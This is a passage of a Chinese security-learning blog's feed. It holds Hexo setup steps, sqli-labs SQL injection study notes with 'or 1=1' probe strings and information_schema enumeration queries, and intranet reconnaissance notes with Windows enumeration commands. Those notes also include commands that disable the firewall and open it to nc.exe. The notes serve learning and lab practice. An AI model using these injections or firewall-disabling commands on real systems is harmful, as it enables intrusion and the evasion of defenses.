src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cdefult.png" alt></p><p>每次更新完博客或者更改了源文件都要执行下列命令提交更新：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git status <span class="comment"># 检查文件状态</span></span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有更新加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure><h3 id="换台电脑写博客"><a href="#换台电脑写博客" class="headerlink" title="换台电脑写博客"></a>换台电脑写博客</h3><p>首先需要在新电脑上将远程仓库克隆下来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@github.com:mysecroad/mysecroad.github.io.git</span><br></pre></td></tr></table></figure><p>输入 <code>git branch</code> 确认一下当前分支是否为 develop 。然后安装 Node.js 和 Git 。接着执行以下命令安装 Hexo：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>装好 Hexo 后，进入 <code>mysecroad.github.io</code> 目录，安装所需要的 Hexo 插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> mysecroad.github.io</span><br><span class="line">$ npm install</span><br><span class="line">$ npm install hexo-asset-image --save <span class="comment"># 图片管理</span></span><br><span class="line">$ npm install hexo-generator-feed --save <span class="comment"># RSS订阅</span></span><br><span class="line">$ npm install hexo-generator-sitemap --save <span class="comment"># 生成 sitemap.xml</span></span><br><span class="line">$ npm install hexo-deployer-git --save <span class="comment"># Git部署</span></span><br><span class="line">$ npm install hexo-generator-search --save <span class="comment"># 站内搜索</span></span><br></pre></td></tr></table></figure><p>按前面的步骤配置好 Git 用户信息和在 Github 上加入 SSH key 后新电脑的环境就搭建好了，就可以写博客了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一直想搭建一个个人博客，用来记录平时的学习心得。我也用过很多博客，想CSDN、博客园、简书等，但最终还是选择了&lt;code&gt;hexo&lt;/code&gt;，这是完全属于我自己的一方净土。&lt;/p&gt;
&lt;h2 id=&quot;什么是-hexo-？&quot;&gt;&lt;a href=&quot;#什么是-hexo-？&quot; cl
      
    
    </summary>
    
    
      <category term="hexo" scheme="http://mysecroad.github.io/categories/hexo/"/>
    
    
      <category term="hexo" scheme="http://mysecroad.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://mysecroad.github.io/posts/16107.html"/>
    <id>http://mysecroad.github.io/posts/16107.html</id>
    <published>2020-04-23T07:58:17.411Z</published>
    <updated>2020-04-23T11:44:34.230Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="ba6dfe94f4eefac9f4c1dfd6b938a978a6b3c4472e8c1bb3bc4719cb2c363dc6">0080238256e3bfab0aad7c6c06adfe08978cf5e4291d19911e89ab77562c795911e174036507d9011817cf2cd0bf4820c481a07fc1f4c68e50a9d7cffbbedaefae12ce81e6c9c0784f5689c858659271c63cd66cfb5a98a47ec5debadb1bd9e728e8309d12cdce8e1f78cba620e874c4411dd7bf75f305dc01e27c342c5d2e21b64e59da6970bcf66d3f55cba5b7bdcaaf081f23692ad77a4c1127bf66bf048d6166f1c46b4ec70fb36b8340fa0e5722559de262ab079f945fbdaca867deb295596bf12cbf5bdc6a3fc465877bfcbe004189a64bfa690ad6d286d1beed5c3edcb526531cec3eadc618be453b0bcca787545b949da46237c40f747e666ba266c019eb4e1659ca03bd11b7adde11ff40a3c924cb6100e5eb1bcf97d7ef00387dca4a68b3508cdfd84fe2f20d147c2d0d5587e17655a90884d9d059ce76357cedfd204c63867b21f9c00dcd2fff8b0331a2d4473305f5a09ab631d617014ab8893423ad6186306492e94797f0185cd56d7ff4f986a08d5e36ff284ab537a9d281a5d4475fef3ca4abd75b1e895f258a8aef2b085b0be236e2473a34845554e1fee0a970f5c3a41d467511316368cc37c344d8e6524ff13fb28eac0493ea84f215f09bb3eeb9b0537c7e0f21f6ee1e2159d3be456639fd85a6d603586ebf85498d54527653319b18e3f6bc3ddc47e270560f300bbc53b657a9d4985fa1aa85f5162c47897542480aaa2d5c2f022ebad717e95660038e60503fc1b91f8a79a80df0b583ce0fab7776d011ce62a1dc93b1962090331357fc9ce4242979acfb1e2a9d0fdef1526369e1d055165b61aa9d2370fe81a7da3981a05cc9281398ce3433bdfb85114f1830a06f5c721e77007c80ec1c89ba36e07ad79289dee286978d088195f15f8c3cb0626d6c3ea9bfec8d76fd3a086d58c10cd2630c77e03e49f513c697ead2456d00955ecca2b0ad3f55590fcd33d080b417c1b65159fee978fabc54b6eb178f2a663011423964c4593a8c6bd96f8ed0c8d1e0b9d3b59293cb7df993d1797faf610fb8525fd7b4bdff95d9aac5c0057486d4635d542b663611a18145829d29e3acdaea51a1aa8bf075099a987c77e52f24cd902f050a8a5a7b5bea2f83f86dc283ff96b29962e79d888fad1b8adb6172b67862236fa0bc2526b9a3ce1d8bf98361249de5e50a600436aa7ac82e545c763500359f4f9a8fc4de6e39220c42f8c82ccd0785c55e99d3b4666632e51454663d7bd4e30d63e26a9a6923533774389a7d454d3f4a9c1ee3c8ee32bf12a78855d717eb37e88031bfe4d149740e207a6d450a3e431627b5140591eec37090c714d52e57e9716107ac734211d2acaa81d67bfb5f9d1293f4076f1ec0f366a77f337fc917cef47eabe809afe309b93237948ff60edd0fbe3e253e51d00207d00c90e6f0a08b18e1430344e1ab59678fdbd1ff374d0831b4d1f6b7f9e3275d6c76ae44b8bd3a25983dec374d877b360f7d5fb9fade8d387e8adb3a4fe9e8fe5b8da0b89dd5c48678fac77239220114b8837246be759de0468ca7e37145665b64dd796c0b76f427923153ccedfd68ccb0b42818b7668ae0e9238777133b4bc379325c7c906a6ba8847d9942fc2c0eea60b83dce9c0f59d59374200baefbff5e80c21d725c3018ea64c6254cd5c96eb69520508f71afe681217f42fdee58840d763329f9b925ad56bd8ab400b97247b4de6a026ebd2f6a34f548633d79c2a08e336435c3360d049ddc7abc757140f4f5ee6b9dc6f3c42a31dfe9bae19d66d0be00fe359cdad201a134849503e975438fc6daa4b533cf85c96def146ef37af5e9d7012a6978183719f9f44772fe273232ce78d1b4d59488f851ff1b9657862c80b1e183e68af57e380cf8217622f5e03b3e90b8654ac7eab72fe9844132bdac52ffd29481788702c2591e835b9a63f2ddbd132cc3b641e152a6e67d3b1caca184b232883c77596b04b92cf212eb650d76c4cf923685ee9fde5d62666257cb54a34975a95023047f8b3f4cc15970001d5de419879d0da8cdcfc5132274887abcf61bae1194cc19efa6b8f17cdaf0e1eb860ba4b98d0a67763b56d313260212986447557be595d86a45d47f3c60df9f6cb888401f5a016f697353061a5c7bc29ee534cc628a5d6b40e049bbcedc3a7e12131584129e0cf9a273b0c7892a9dedada03990faffcddbc292ea1db8258c556b79cfbf2c2b2d703bf82796ec1b8be7ed7484dda54938b8afd648f65142b711d1b68a77e787acc1d735d6986efc13ed7a4fcf7836f723b2235225aa1e27918f31e1cc1ecc224d341f77edc4d114376c5a2b41f87d01e54b0b2514578402ba7ed2625472884e2e5816b5c76a572aa81b81c748bcd5c7138f8b50e1ac8b4852907b56181a0d4f38df38a033d11cec44b88b290caefd1c92cb92cae529e04f5c576d7cb1c406a411fd574d8f0ecb443f048ca2c15c85bc60cc750b3db46cb1c1077b6433ef49f101bca7075ca34271acda14ef5b8120d60f5ff2020680c19ecbf86a8eaa2260cf939a3dfc278f337d2a9d0aa0a7d8c1c3a7401a279154a1dfa20411e8570466cc6f5f660add3d8b95581905141574abf892550b477d83e55686bff510d3b5e0fd985e06cfa2329ce6ad8e986db6897a56746b97343fc8d870c6cedf14539e0a7fb0a67de8029efe8bce0b141bd93d33b88f69fa1463664975a6d5654369f2b6e593216c03e3fc5b91996491b153811dcd9cea4d1524e9749ac8174a9abc08aad423809e070b0e1fe2756e2257e2e52d51c5ea79ff35df2944badca982eaf8804ad642c86796c8ff7a9db6d068bf601f965848c6b5a93871b6a65d628cdb7c5def6635093eda53f2b0a4c0fd096097eb6dd535bd2fac75ac2b4aaf9039dfc60853f46c4af8569e9fd3f7e34ea3462922d1a0ef6b5a02765eb569199f43b93ca76ffb9a77cd725d0d2e042215f260f4c46a3c4450fa8cacc1d8d5436c7a7274eedaa8c6fdb8aac61668df47073355abf4c52fb8f1a4b4e2f0c0622f8ed50e49af592db131b38875178b7f48e369057d80361ef7f8b37915bd89a8506adc78476abc66908bf434ddc2ee6222d5866442c76f1e26c362715ff3d88bba3eee3434cce5c63fac28681cdae2125635f1dae60b54ce7cbeaef6753fcf5284bda04cd3312c57f454cb0213ec09cbf3f3d71ef012077df60266593fe6b3efc74eaf3f429676b23754e6417d045b313c035237f93bcc0044aca49d1fef1643de5b388b2f7adabf5eea51ac260bbb5af9882304cadaf33d42799614458000b05d26b12e28722b15a3dbdc232713dcf5f3b978f825a43a47246f475457d0c5a037efb2d045988f15f06f90ec528f03aa0bd1111efe3cda116454fc53c72a822a6f32eef93506b0580bc88f4f418b97c23d8e6f07b179c420d8bc582b8dbe46e9e446177e1d1ddcb430fa6f41e92a5a7d42ac7d</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      输入密码，查看文章！
    
    </summary>
    
    
      <category term="hexo" scheme="http://mysecroad.github.io/categories/hexo/"/>
    
    
  </entry>
  
  <entry>
    <title>Sqli-labs学习</title>
    <link href="http://mysecroad.github.io/posts/20471.html"/>
    <id>http://mysecroad.github.io/posts/20471.html</id>
    <published>2020-04-12T04:12:44.000Z</published>
    <updated>2020-04-26T09:24:33.119Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a> </p><h2 id="第一部分（page-1-Basic-Challenges）"><a href="#第一部分（page-1-Basic-Challenges）" class="headerlink" title="第一部分（page-1 Basic Challenges）"></a>第一部分（page-1 Basic Challenges）</h2><h3 id="Background-1-基础知识"><a href="#Background-1-基础知识" class="headerlink" title="Background-1 基础知识"></a>Background-1 基础知识</h3><ol><li><p>注入的分类</p><ul><li><p>基于从服务器接收到的响应 </p><ul><li>基于错误的SQL注入</li><li>联合查询注入</li><li>堆查询注入</li><li>盲注（布尔盲注、时间盲注、报错盲注）</li></ul></li><li><p>基于如何处理输入的SQL查询（数据类型）</p><ul><li>基于字符串</li><li>数字或整数为基础的</li></ul></li><li><p>基于程度和顺序的注入（哪里发生了影响）</p><ul><li><p>一阶注入</p></li><li><p>二阶注入</p></li></ul><p>一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；二阶注入类似存 储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间 接的对 WEB 产生危害，这样的就被称为是二阶注入. </p></li><li><p>基于注入点的位置上</p><ul><li>通过用户输入的表单域的注射</li><li>通过cookie注射</li><li>通过服务器变量注射（基于头部信息的注射）</li></ul></li></ul></li><li><p>系统函数</p><ul><li>version()  –MySQL版本</li><li>user() –数据库用户名</li><li>database() –数据库名</li><li>@@datadir –数据库路径</li><li>@@version_compile_os –操作系统版本</li></ul></li><li><p>字符串连接函数</p><p>函数具体介绍 <a href="http://www.cnblogs.com/lcamry/p/5715634.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5715634.html</a> </p><ul><li>concat(str1, str2, …)  – 没有分隔符的连接字符串</li><li>concat_ws(separator, str1, str2, …) – 有分隔符的连接字符串</li><li>group_concat(str1, str2, …) – 连接一个组的所有字符串，并以逗号分隔每一条数据 </li></ul></li><li><p>一般用于尝试的语句</p><p>ps：<code>--+</code>可以用 <code>#</code> 替换， url提交过程中url编码后的<code>#</code>为<code>%23</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">or 1=1 --+</span><br><span class="line">' or 1=1 --+</span><br><span class="line">" or 1=1 --+</span><br><span class="line">) or 1=1 --+</span><br><span class="line">') or 1=1 --+</span><br><span class="line">") or 1=1 --+</span><br><span class="line">")) or 1=1 --+</span><br></pre></td></tr></table></figure><p>一般的代码为： </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET['id']; </span><br><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>此处考虑两个点，一个是闭合前面你的<code>&#39;</code>，另一个是处理后面的 <code>&#39;</code>，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23） </p></li><li><p>union操作符的介绍</p><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的 列的顺序必须相同。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name(s) from table_name1 union select column_name(s) from table_name2</span><br></pre></td></tr></table></figure><p>默认地，<code>UNION</code> 操作符选取不同的值。如果允许重复的值，请使用 <code>UNION ALL</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name(s) <span class="keyword">from</span> table_name1 <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> column_name(s) <span class="keyword">from</span> table_name2</span><br></pre></td></tr></table></figure><p>UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名</p></li><li><p>SQL中的逻辑运算</p></li><li><p>注入流程</p><p><img src="/posts/20471/F:%5Chexo-blog%5Csource_posts%5CSqli-labs%E5%AD%A6%E4%B9%A0%5Cimage-20200413190947414.png" alt="image-20200413190947414"></p></li></ol><p>Mysql 有一个系统数据库 information_schema，存储着所有的数据库的相关信息，一般的， 我们利用该表可以进行一次完整的注入。以下为一般的流程。 </p><p>猜数据库 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure><p>猜某库的数据表 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’</span><br></pre></td></tr></table></figure><p>猜某表的所有列 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name&#x3D;’xxxxx’</span><br></pre></td></tr></table></figure><p>获取某列的内容 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select *** from ****</span><br></pre></td></tr></table></figure><h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><h3 id="Background-2-盲注的讲解"><a href="#Background-2-盲注的讲解" class="headerlink" title="Background-2 盲注的讲解"></a>Background-2 盲注的讲解</h3><h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sqli-labs&quot;&gt;&lt;a href=&quot;#sqli-labs&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs&quot;&gt;&lt;/a&gt;sqli-labs&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
    
      <category term="SQL注入" scheme="http://mysecroad.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike 4.0学习</title>
    <link href="http://mysecroad.github.io/posts/7578.html"/>
    <id>http://mysecroad.github.io/posts/7578.html</id>
    <published>2020-04-08T03:34:55.000Z</published>
    <updated>2020-04-26T09:24:33.105Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>内网信息收集</title>
    <link href="http://mysecroad.github.io/posts/12754.html"/>
    <id>http://mysecroad.github.io/posts/12754.html</id>
    <published>2020-04-08T03:31:22.000Z</published>
    <updated>2020-04-26T09:24:33.174Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>首先需要对当前所处的网络环境进行判断。判断涉及三个方面：</p><ul><li>我是谁？ —— 对当前机器角色的判断</li></ul><p>​       判断当前机器是普通的web服务器、开发测试服务器、文件服务器等。具体判断根据机器的主机名、文件、网络连接等情况综合完成。</p><ul><li><p>这是哪？ —— 对当前机器所处的网络环境的拓扑结构进行分析和判断</p><p>对所处的内网进行全面的数据收集和分析整理，绘制出大致的内网整体拓扑结构图。</p></li><li><p>我在哪？ —— 对当前机器所处区域的判断</p><p>判断机器处于网络拓扑中的哪个区域，是在DMZ、办公区还是核心区。</p></li></ul><h2 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h2><h3 id="手动收集信息"><a href="#手动收集信息" class="headerlink" title="手动收集信息"></a>手动收集信息</h3><p>本机信息包括操作系统、权限、内网IP地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，操作系统、应用软件、补丁、服务、杀毒软件一般都是批量安装的。</p><p>通过本机的相关信息，进一步了解整个域的操作系统版本、软件及补丁安装情况、用户命名方式等。</p><ol><li><p>查询网络配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure><img src="/posts/12754/Users\PanLv\AppData\Roaming\Typora\typora-user-images\image-20200320131051116.png" alt="ipconfig /all" style="zoom:67%;"></li><li><p>查询操作系统及软件信息</p><p>查询操作系统和版本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;</span><br><span class="line">中文版</span><br><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320170458113.png" alt="image-20200320170458113"></p><p>查看系统体系结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320170803258.png" alt="image-20200320170803258"></p><p>查看安装的软件及版本、路径等</p><p>利用<code>wmic</code>命令，将输出结果到文本文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320171109489.png" alt="image-20200320171109489"></p><p>利用powershell命令，收集软件的版本信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">"Get-WmiObject -class Win32_Product |Select-Object -Property name,version"</span></span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320171356318.png" alt="image-20200320171356318"></p><p>查询本机服务信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320171545322.png" alt="image-20200320171545322"></p><p>查询进程列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320171800764.png" alt="当前进程"></p><p>查看进程信息</p><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320171913377.png" alt="进程信息"></p><p>查看启动程序信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320172134213.png" alt="启动程序信息"></p><p>查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320172338158.png" alt="计划任务"></p><p>查看主机开机时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320172516571.png" alt="主机开机时间"></p><p>查询用户列表（可以找出内网机器的命令规则）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320172619261.png" alt="用户列表"></p><p>获取本地管理员信息（通常包含域用户）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320172850280.png" alt="本地管理员"></p><p>查询当前在线用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320173015257.png" alt="在线用户"></p><p>列出或断开本地计算机与所连接的客户端之间的会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><p>查询端口列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320173231595.png" alt="端口列表"></p><p>查看补丁列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320173416455.png" alt="补丁列表"></p><p>需要注意系统的版本、位数、域、补丁信息及更新频率等。域内主机的补丁通常是批量安装的通过查看本机的补丁列表，就可以找到为打补丁的漏洞。</p><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320173519555.png" alt="补丁"></p><p>使用wmic命令查看安装在系统中的补丁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320173846237.png" alt="更新补丁"></p><p>查看本机共享列表和可访问的域共享列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320174007610.png" alt="共享列表"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320174108057.png" alt="wmic共享列表"></p><p>查询路由表及所有可用接口的ARP（地址解析协议）缓存表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route <span class="built_in">print</span></span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320203520428.png" alt="路由表"></p><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320203601604.png" alt="arp缓存表"></p><p>查询防火墙相关配置</p><ul><li><p>关闭防火墙（管理员权限）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall <span class="built_in">set</span> opmode <span class="built_in">disable</span>  <span class="comment"># win server 2003及之前的版本</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off <span class="comment"># win server 2003之后版本</span></span><br></pre></td></tr></table></figure></li><li><p>查看防火墙配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure></li><li><p>修改防火墙配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># win server 2003及之前版本，允许指定程序全部连接</span></span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe <span class="string">"allow nc"</span> <span class="built_in">enable</span></span><br><span class="line"><span class="comment"># win server 2003之后版本</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"pass nc"</span> dir <span class="keyword">in</span> action=allow program=<span class="string">"c:\nc.exe"</span>  <span class="comment"># 允许指定程序进入</span></span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"Allow nc"</span> dir=out action=allow program=<span class="string">"c:\nc.exe"</span>  <span class="comment"># 允许指定程序退出</span></span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"Remote Desktop"</span> protocol=TCP dir=<span class="keyword">in</span> localport=3389 action=allow  <span class="comment"># 允许3389端口放行</span></span><br></pre></td></tr></table></figure></li><li><p>自定义防火墙日志的存储位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile logging filename <span class="string">"c:\windows\temp\fw.log"</span></span><br></pre></td></tr></table></figure></li></ul><p>查看代理配置情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"</span>   <span class="comment"># 可以看到服务器127.0.0.1的1080端口的代理配置信息</span></span><br></pre></td></tr></table></figure><img src="/posts/12754/images\image-20200320210146225.png" alt="image-20200320210146225" style="zoom:80%;"><p>查询并开启远程连接服务</p><ul><li><p>查看远程连接端口</p><p>在命令行环境中执行注册表查询语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY <span 